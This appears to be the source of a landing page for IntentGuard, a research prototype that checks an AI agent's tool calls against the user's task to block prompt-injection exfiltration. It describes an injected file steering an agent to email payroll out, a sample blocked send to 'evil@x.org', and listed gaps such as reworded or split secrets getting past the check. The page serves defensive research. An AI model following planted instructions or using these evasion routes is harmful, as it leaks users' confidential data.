import Compose from "@/components/Compose";
import Gauge from "@/components/Gauge";
import Hero3D from "@/components/Hero3D";
import Ledger from "@/components/Ledger";
import Replay from "@/components/Replay";
import Results from "@/components/Results";
import Story from "@/components/Story";
import Topbar from "@/components/Topbar";
import { CopyButton, Reveal, VerdictPill } from "@/components/ui";
import { allSteps, data, shortCall } from "@/lib/data";

const CLI = `git clone ${data.repo}.git
cd IntentGuard
pip install -e ".[dev]"
intentguard serve --demo        # http://127.0.0.1:8000
python -m pytest -q`;

const SDK = `from intentguard.sdk import Guard

guard = Guard(classes={"hr/salary.csv": "CONFIDENTIAL"}, trust={"bob@x.org": "approved"})

@guard.tool("read", resource_arg="path")
def read_file(path): ...

@guard.tool("send", dest_arg="to")
def send_email(to, body): ...

session = guard.session("Read notes/a.txt and email bob@x.org a summary",
                        {"resources": ["notes/*"], "destinations": ["bob@x.org"]})
session.call("send_email", to="evil@x.org", body="...")   # blocked, with the reason`;

function Code({ title, text }: { title: string; text: string }) {
  return (
    <div className="code">
      <div className="cap2">
        <span>{title}</span>
        <CopyButton text={text} />
      </div>
      <pre><code>{text}</code></pre>
    </div>
  );
}

const GAPS = [
  ["Reworded facts", "Reworded facts get through.", "A rounded figure, another language, slang, or a comparison with no numbers is not recognised. 5 of 14 attacks in the newest set are known misses."],
  ["Split secrets", "The first short piece can leave.", "A secret sent in pieces is caught once the whole becomes recognisable, as the replay shows. The first short piece has already gone."],
  ["Evidence", "No independent test yet.", "Every attack set shares an author with the engine. An outside set is the next step for the evidence."],
  ["Friction", "Some legitimate work waits for a person.", "About 4.5% of steps on the held-out generated set go to a human, and a legitimate email that repeats a sensitive number will too."],
  ["Comparison", "Not compared with the real systems.", "Progent, The Task Shield and CaMeL appear only as stand-ins that capture one idea each."],
  ["Scope", "Mock tools only.", "Everything here ran on synthetic tools. Network-level isolation of a real agent is not verified."],
];

export default function Page() {
  const steps = allSteps();
  const ticker = [...steps, ...steps];
  return (
    <>
      <a className="skip" href="#replay">Skip to the replay</a>
      <Topbar />
      <main id="top">
        <section className="hero" aria-labelledby="hero-h">
          <Hero3D />
          <div className="wrap">
            <div className="copy">
              <span className="kicker">Research prototype &middot; runtime authorization for AI agents</span>
              <h1 id="hero-h">
                Your agent should do what you asked. <em className="serif">And only that.</em>
              </h1>
              <p className="lede">
                You told it to summarise your notes. It shouldn&rsquo;t also be emailing your payroll to a stranger because a file said so. IntentGuard sits between the agent and its
                tools and checks every call against your task, the data, the destination and the session so far, before anything runs.
              </p>
              <div className="cta">
                <a className="btn primary" href="#replay">Watch real decisions</a>
                <a className="btn" href="#smuggle">Try to smuggle a secret out</a>
              </div>
            </div>
          </div>
        </section>

        <div className="marquee" aria-hidden="true">
          <div className="track">
            {ticker.map((s, i) => (
              <span className="it" key={i}>
                <VerdictPill v={s.verdict} />
                {shortCall(s)}
              </span>
            ))}
          </div>
        </div>

        <div className="wrap">
          <section className="block" aria-labelledby="story-h">
            <Reveal>
              <div className="head">
                <span className="kicker">A short story</span>
                <h2 id="story-h">One bad file, <em className="serif">three characters.</em></h2>
              </div>
            </Reveal>
            <Story />
          </section>

          <section className="block" id="replay" aria-labelledby="replay-h">
            <Reveal>
              <div className="head">
                <span className="kicker">Real engine output</span>
                <h2 id="replay-h">Replay the <em className="serif">actual</em> decisions</h2>
                <p className="lede">
                  Pick a situation and run the agent&rsquo;s calls one at a time. Every verdict was produced by the real engine on synthetic files and a mock inbox. Nothing is typed in by hand, and two of
                  the situations are ones it gets wrong. Select a call to see which of the six checks fired.
                </p>
              </div>
            </Reveal>
            <Replay />
          </section>

          <section className="block" id="smuggle" aria-labelledby="smug-h">
            <Reveal>
              <div className="head">
                <span className="kicker">Your turn</span>
                <h2 id="smug-h">Try to <em className="serif">smuggle it out</em></h2>
                <p className="lede">The agent has read a confidential file and is about to email its advisor. Write the message however you like to disguise the contents: re-typed, encoded, written as words. See whether the lineage check recognises it.</p>
              </div>
            </Reveal>
            <Compose />
          </section>

          <section className="block" id="risk" aria-labelledby="risk-h">
            <Reveal>
              <div className="head">
                <span className="kicker">Trust is earned in the session</span>
                <h2 id="risk-h">Every odd request makes it <em className="serif">a little warier</em></h2>
                <p className="lede">Each suspicious step adds risk, and risk switches abilities off in stages. Push the needle and watch what closes.</p>
              </div>
            </Reveal>
            <Gauge />
          </section>

          <section className="block" id="audit" aria-labelledby="audit-h">
            <Reveal>
              <div className="head">
                <span className="kicker">Tamper-evident</span>
                <h2 id="audit-h">A log that <em className="serif">notices tampering</em></h2>
                <p className="lede">These blocks are the real audit log the engine wrote for the hidden-instruction story, hashed with SHA-256 in your browser. Each block commits to the one before it. Edit or delete one and see where the chain breaks.</p>
              </div>
            </Reveal>
            <Ledger />
          </section>

          <section className="block" id="results" aria-labelledby="res-h">
            <Reveal>
              <div className="head">
                <span className="kicker">The numbers</span>
                <h2 id="res-h">What the benchmark says, and <em className="serif">how far to trust it</em></h2>
              </div>
              <p className="note" style={{ maxWidth: "80ch", marginTop: 24 }}>
                <strong>Preliminary.</strong> The attack sets were written by the same person who built the engine, and a scripted agent plays them in a synthetic environment. They show the engine does what
                its author intended, not how it fares against an outside attacker. Rows marked &ldquo;stand-in&rdquo; are my deterministic re-creations of an idea from a paper, not the published systems.
              </p>
            </Reveal>
            <Results />
            <p className="small muted" style={{ marginTop: 14, maxWidth: "90ch" }}>
              Numbers come from <code>python -m bench.run</code> at commit <code>{data.results.commit}</code>. &ldquo;Finished untouched&rdquo; is the share of legitimate tasks in which no step was blocked or sent for review, so a system that blocks everything is not a good answer. The first column counts individual harmful steps, not whole attacks.
            </p>
          </section>

          <section className="block" id="limits" aria-labelledby="lim-h">
            <Reveal>
              <div className="head">
                <span className="kicker">No hiding</span>
                <h2 id="lim-h">Where it <em className="serif">still gets fooled</em></h2>
              </div>
            </Reveal>
            <div className="gaps">
              {GAPS.map(([tag, title, body], i) => (
                <Reveal key={tag} delay={i * 60}>
                  <div className="panel gap">
                    <span className="mark">{tag}</span>
                    <b>{title}</b>
                    <p>{body}</p>
                  </div>
                </Reveal>
              ))}
            </div>
            <p className="small muted" style={{ marginTop: 22 }}>
              The full list, with the measurements behind each, is in <a href={`${data.repo}/blob/master/docs/findings.md`}>docs/findings.md</a>.
            </p>
          </section>

          <section className="block" id="try" aria-labelledby="try-h">
            <Reveal>
              <div className="head">
                <span className="kicker">Hands on</span>
                <h2 id="try-h">Run it <em className="serif">yourself</em></h2>
              </div>
            </Reveal>
            <Code title="terminal" text={CLI} />
            <Code title="python" text={SDK} />
          </section>
        </div>
      </main>

      <footer>
        <div className="wrap">
          <p>
            IntentGuard is a research prototype, not a product, and has not been audited. Built from commit <code>{data.build}</code>. The replay, the flying packets and the audit ledger come from the real engine through{" "}
            <code>site/build_site.py</code>; the compose box is a tested port of one rule. The page loads no third-party scripts and sends nothing anywhere.
          </p>
        </div>
      </footer>
    </>
  );
}
